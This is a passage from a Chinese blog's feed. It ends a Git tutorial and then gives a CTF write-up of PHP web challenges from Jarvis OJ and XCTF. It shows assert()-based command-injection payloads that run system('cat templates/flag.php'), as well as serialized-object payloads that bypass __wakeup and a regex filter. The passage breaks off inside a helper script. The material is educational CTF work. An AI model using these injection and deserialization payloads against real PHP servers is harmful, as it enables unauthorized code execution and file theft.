class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">There is no tracking information for the current branch.</span><br><span class="line">Please specify which branch you want to merge with.</span><br><span class="line">See git-pull(1) for details.</span><br><span class="line"></span><br><span class="line">    git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"></span><br><span class="line">If you wish to set tracking information for this branch you can do so with:</span><br><span class="line"></span><br><span class="line">    git branch --set-upstream-to=origin/&lt;branch&gt; dev</span><br></pre></td></tr></table></figure><blockquote><p><code>git pull</code>也失败了，原因是没有指定本地<code>dev</code>分支与远程<code>origin/dev</code>分支的链接，根据提示，设置<code>dev</code>和<code>origin/dev</code>的链接：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch --<span class="built_in">set</span>-upstream-to=origin/dev dev</span></span><br><span class="line">Branch 'dev' set up to track remote branch 'dev' from 'origin'.</span><br></pre></td></tr></table></figure><blockquote><p>再pull：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">Auto-merging env.txt</span><br><span class="line">CONFLICT (add/add): Merge conflict in env.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure><blockquote><p>这回<code>git pull</code>成功，但是合并有冲突，需要手动解决，解决的方法和分支管理中的<a href="#### 7.解决冲突">解决冲突</a>完全一样。解决后，提交，再push：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"fix env conflict"</span></span></span><br><span class="line">[dev 57c53ab] fix env conflict</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin dev</span></span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (4/4), done.</span><br><span class="line">Writing objects: 100% (6/6), 621 bytes | 621.00 KiB/s, done.</span><br><span class="line">Total 6 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line">   7a5e5dd..57c53ab  dev -&gt; dev</span><br></pre></td></tr></table></figure><p>因此，多人协作的工作模式通常是这样：</p><ol><li>首先，可以试图用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改；</li><li>如果推送失败，则因为远程分支比你的本地更新，需要先用<code>git pull</code>试图合并；</li><li>如果合并有冲突，则解决冲突，并在本地提交；</li><li>没有冲突或者解决掉冲突后，再用<code>git push origin &lt;branch-name&gt;</code>推送就能成功！</li></ol><p>如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>。这就是多人协作的工作模式，一旦熟悉了，就非常简单。</p><h3 id="三、命令总结"><a href="#三、命令总结" class="headerlink" title="三、命令总结"></a>三、命令总结</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">`配置用户名`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"email@example.com"</span></span></span><br><span class="line"></span><br><span class="line">`初始化`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br><span class="line"></span><br><span class="line">`将文件添加到仓库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add fileName</span></span><br><span class="line"></span><br><span class="line">`将文件提交到仓库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"&lt;本次提交的说明&gt;"</span></span></span><br><span class="line"></span><br><span class="line">`查看当前仓库的状态`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line"></span><br><span class="line">`查看修改的内容`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git diff fileName</span></span><br><span class="line"></span><br><span class="line">`查看历史记录`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line"></span><br><span class="line">`版本回退`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^/SHA1-ID</span></span><br><span class="line"></span><br><span class="line">`查看每一次命令的信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br><span class="line"></span><br><span class="line">`丢弃工作区的修改`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- fileName</span></span><br><span class="line"></span><br><span class="line">`删除文件`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git rm test.txt</span></span><br><span class="line"></span><br><span class="line">`将本地仓库和远程仓库关联起来`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin <span class="string">"Your Github repository name"</span></span></span><br><span class="line"></span><br><span class="line">`查看远程库信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote</span></span><br><span class="line"></span><br><span class="line">`查看远程库详细信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote -v</span></span><br><span class="line"></span><br><span class="line">`将本地仓库的内容推送到远程库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br><span class="line"></span><br><span class="line">`创建分支`+-----------------+</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch dev++</span></span><br><span class="line">+========== $ git checkout -b dev</span><br><span class="line">`切换分支`   ++</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev or $ git switch dev +-----------------+</span></span><br><span class="line"></span><br><span class="line">`查看当前分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch </span></span><br><span class="line"></span><br><span class="line">`将dev分支合并到当前分支（启用Fast forward）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br><span class="line"></span><br><span class="line">`将dev分支合并到当前分支（禁用Fast forward）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge with no-ff"</span> dev</span></span><br><span class="line"></span><br><span class="line">`查看分支合并的情况`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --graph</span></span><br><span class="line"></span><br><span class="line">`删除分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br><span class="line"></span><br><span class="line">`强行删除分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -D dev</span></span><br><span class="line"></span><br><span class="line">`储存当前分支的工作现场`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br><span class="line"></span><br><span class="line">`从当前分支上切换到存在Bug的分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branchName]</span></span><br><span class="line"></span><br><span class="line">`创建Bug分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b issue-101</span></span><br><span class="line"></span><br><span class="line">`修复Bug（手动修复）`</span><br><span class="line"></span><br><span class="line">`从bug分支上切换到存在Bug的分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch [branchName]</span></span><br><span class="line"></span><br><span class="line">`合并分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merged bug fix 101"</span> issue-101</span></span><br><span class="line"></span><br><span class="line">`切换到干活的分支`</span><br><span class="line"></span><br><span class="line">`查看当前分支的工作现场`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br><span class="line"></span><br><span class="line">`恢复当前分支的工作现场（stash内容并不删除）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash apply</span></span><br><span class="line"></span><br><span class="line">`恢复当前分支的工作现场（stash内容删除）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br><span class="line"></span><br><span class="line">`在不同的分支上同步修改bug的操作`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick 4c805e2(master的sha1值)</span></span><br><span class="line"></span><br><span class="line">`推送分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin <span class="string">"branchName"</span></span></span><br><span class="line"></span><br><span class="line">`抓取分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">等价于：git fetch   git merge &lt;Branch Name&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、Git-教程&quot;&gt;&lt;a href=&quot;#一、Git-教程&quot; class=&quot;headerlink&quot; title=&quot;一、Git 教程&quot;&gt;&lt;/a&gt;一、Git 教程&lt;/h3&gt;&lt;h4 id=&quot;1-Git-介绍&quot;&gt;&lt;a href=&quot;#1-Git-介绍&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP相关题目writeup（持续更新）</title>
    <link href="https://muzibing.github.io/2020/07/28/2020.07.28%EF%BC%88142%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/28/2020.07.28（142）/</id>
    <published>2020-07-27T16:00:00.000Z</published>
    <updated>2020-08-17T14:28:15.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-函数漏洞问题"><a href="#0x00-函数漏洞问题" class="headerlink" title="0x00 函数漏洞问题"></a><font color="navy"><code>0x00 函数漏洞问题</code></font></h2><h3 id="【Jarvois-OJ-web】BabyPHP"><a href="#【Jarvois-OJ-web】BabyPHP" class="headerlink" title="【Jarvois OJ-web】BabyPHP"></a><font color="blue"><code>【Jarvois OJ-web】BabyPHP</code></font></h3><h4 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><p><img src="/images/142-1.png" alt></p><h4 id="2-GIT-源码泄露"><a href="#2-GIT-源码泄露" class="headerlink" title="2.GIT 源码泄露"></a><code>2.GIT 源码泄露</code></h4><p>通过上图的提示，我们猜测是不是可以通过git泄露源码，从而进行得到php代码，有关GIT源码泄露的可以<a href="https://www.jianshu.com/p/edae09535ea3" target="_blank" rel="noopener">点击这里</a>，有关git的介绍可以<a href="https://muzibing.github.io/2020/07/29/2020.07.29（143）/">点击这里</a>，下面我们得到如下的文件及文件夹：</p><p><img src="/images/142-2.jpg" alt></p><h4 id="3-查看index-php源码"><a href="#3-查看index-php源码" class="headerlink" title="3.查看index.php源码"></a><code>3.查看index.php源码</code></h4><p>打开index.php源码，可以得到其中最为关键的一段代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>也就是说把我们输入的page相关字符串解析为<code>assert(&quot;strpos(&#39;templates/payload.php&#39;, &#39;..&#39;) === false&quot;)</code>，其中：</p><ul><li>strpos()：查找 “..” 在file字符串中第一次出现的位置，也就是说我们不能使用目录注入了</li><li>assert()：检查一个断言是否为 <strong><code>FALSE</code></strong>，如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</li></ul></blockquote><h4 id="4-构造payload"><a href="#4-构造payload" class="headerlink" title="4.构造payload"></a><code>4.构造payload</code></h4><blockquote><p>根据上文，我们可以构造如下payload：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：page = <span class="string">'.system("cat templates/flag.php").'</span></span><br><span class="line">payload2：page = <span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//</span></span><br></pre></td></tr></table></figure><blockquote><p>被运行时，在index.php中被执行的形式为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="string">"templates'.system("</span>cat templates/flag.php<span class="string">").'.php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('templates'.system("</span>cat templates/flag.php<span class="string">").'.php"</span><span class="string">', '</span>..<span class="string">') === false") or die("Detected hacking attempt!");</span></span><br><span class="line"><span class="string">assert("file_exists('</span>templates<span class="string">'.system("cat templates/flag.php").'</span>.php<span class="string">')") or die("That file doesn'</span>t exist!<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file = "</span><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//"</span></span><br><span class="line"><span class="string">assert("strpos('</span><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br><span class="line"><span class="string">assert("</span>file_exists(<span class="string">''</span>,<span class="string">'..'</span>)===<span class="keyword">False</span> <span class="keyword">and</span> system(<span class="string">'cat templates/flag.php'</span>);<span class="comment">//')") or die("That file doesn't exist!");</span></span><br></pre></td></tr></table></figure><blockquote><p>注：不是很明白为什么这样构造</p></blockquote><h2 id="0x01-反序列化问题"><a href="#0x01-反序列化问题" class="headerlink" title="0x01 反序列化问题"></a><font color="navy"><code>0x01 反序列化问题</code></font></h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><code>基础知识</code></h3><blockquote><p>要想知道反序列化问题，就必须知道 1) 序列化后的数据格式；2) 触发/绕过魔术函数的方法；</p><p><code>问题一：序列化后的数据格式</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span> </span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">tes1t</span></span></span><br><span class="line"><span class="class">&gt; </span>&#123;</span><br><span class="line">&gt; <span class="keyword">private</span> $flag = <span class="string">"Inactive"</span>;</span><br><span class="line">&gt; <span class="keyword">protected</span> $test = <span class="string">"test"</span>;</span><br><span class="line">&gt; <span class="keyword">public</span> $test1 = <span class="string">"test1"</span>;</span><br><span class="line">&gt; <span class="keyword">protected</span> $test2 = <span class="string">"test2"</span>;</span><br><span class="line">&gt; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">&gt; </span>&#123;</span><br><span class="line">&gt; <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; $object = <span class="keyword">new</span> tes1t();</span><br><span class="line">&gt; $object-&gt;set_flag(<span class="string">"Inactive"</span>);</span><br><span class="line">&gt; $data = serialize($object);</span><br><span class="line">&gt; <span class="keyword">echo</span> $data;</span><br><span class="line">&gt; <span class="meta">?&gt;</span> </span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>上述代码产生的数据格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; O:<span class="number">5</span>:<span class="string">"tes1t"</span>:<span class="number">4</span>:&#123;s:<span class="number">11</span>:<span class="string">"tes1tflag"</span>;s:<span class="number">8</span>:<span class="string">"Inactive"</span>;s:<span class="number">7</span>:<span class="string">"*test"</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">5</span>:<span class="string">"test1"</span>;s:<span class="number">5</span>:<span class="string">"test1"</span>;s:<span class="number">8</span>:<span class="string">"*test2"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;&#125; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>其中：</p><ul><li>O：表示一个对象</li><li>5：表示对象名占4个字符</li><li>“teslt”：表示对象名</li><li>4：表示该对象有4个属性（不含方法）</li><li>private：tesltflag =&gt; %00teslt%00flag</li><li>protected：<em>test =&gt; %00\</em>%00test</li></ul><p><code>问题二：触发/绕过魔术函数的方法</code></p><p>首先介绍一下魔术方法：</p><ul><li><strong>construct()</strong>：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)</li><li><strong>wakeup()</strong>：unserialize()时会自动调用，反序列化无论如何都是要先调用<code>__wakeup</code>函数的，但是当属性数值&gt;属性真实个数时，就会跳过执行__wakeup()函数<ul><li><strong>存在漏洞的PHP版本</strong>：PHP5.6.25之前版本和7.0.10之前的7.x版本</li><li><strong>漏洞概述</strong>：<code>__wakeup()</code>魔法函数被绕过,导致执行了一些非预期效果的漏洞</li><li><strong>漏洞原理</strong>：<code>当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过</code></li></ul></li><li><strong>destruct()</strong>：当对象被销毁时会自动调用</li><li><strong>toString()</strong>：当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li><li><strong>get()</strong>：当从不可访问的属性读取数据</li><li><strong>call()</strong>：在对象上下文中调用不可访问的方法时触发</li></ul><p>从序列化到反序列化这几个函数的执行过程是：<code>先调用__construct()-&gt;__sleep-&gt;__wakeup()-&gt;__toString ()-&gt;__destruct()</code></p></blockquote><h3 id="【XCTF-web】unserialize3"><a href="#【XCTF-web】unserialize3" class="headerlink" title="【XCTF-web】unserialize3"></a><font color="blue"><code>【XCTF-web】unserialize3</code></font></h3><h4 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><h4 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><blockquote><p>这里需要进行反序列化，并且要绕过 <code>__wakeup</code> 魔术函数，这里需要的知识点有：</p><ol><li>将数据序列化后的数据格式是什么样子？</li><li>如何绕过<code>__wakeup</code>函数？</li></ol></blockquote><h4 id="3-构造payload"><a href="#3-构造payload" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>从上面的基础知识可以得到序列化后的数据格式，并且<code>当对象的属性(变量)数大于实际的个数时，__wakeup()魔法函数被绕过</code>，那么这里我们就可以构造出payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;,s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到如下flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the answer is : cyberpeace&#123;7d67cd73e3c53d91d218d6a75563f5e3&#125;</span><br></pre></td></tr></table></figure><h3 id="【XCTF-web】Web-php-unserialize27"><a href="#【XCTF-web】Web-php-unserialize27" class="headerlink" title="【XCTF-web】Web_php_unserialize27"></a><font color="blue"><code>【XCTF-web】Web_php_unserialize27</code></font></h3><h4 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-题目分析-1"><a href="#2-题目分析-1" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><p>我们一部分一部分的分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var = base64_decode($_GET[<span class="string">'var'</span>]);</span><br></pre></td></tr></table></figure><blockquote><p>对我们输入的payload进行base64解码，也就是说我们输入的payload要经过base64编码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var))</span><br></pre></td></tr></table></figure><blockquote><p>也就是说我们解码后的输入的形式如果是<code>[oc]:\d+:</code>（不区分大小写）则会输出<code>stop hacking</code>，但是如果我们的输入是<code>O:+4:</code>，就可以绕过正则过滤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@unserialize($var);</span><br></pre></td></tr></table></figure><blockquote><p>反序列化我们的var值</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果执行反序列化，那么就得执行该函数，所以和上一道题目一样，我们需要绕过该函数。</p></blockquote><h4 id="3-构造payload-1"><a href="#3-构造payload-1" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>根据上文分析，我们可以构造如下的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">"\x00Demo\x00file"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是我们需要将其进行base64编码，这里就需要注意一个常见的坑，就是<code>private</code>属性的名字填写，两边要有两个<code>\x00</code>，这个时候我们不能直接将其进行base64编码，所以我们要将其用十六进制形式打开，改掉里面的内容，或者用下面的脚本进行修改：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"2.txt"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> 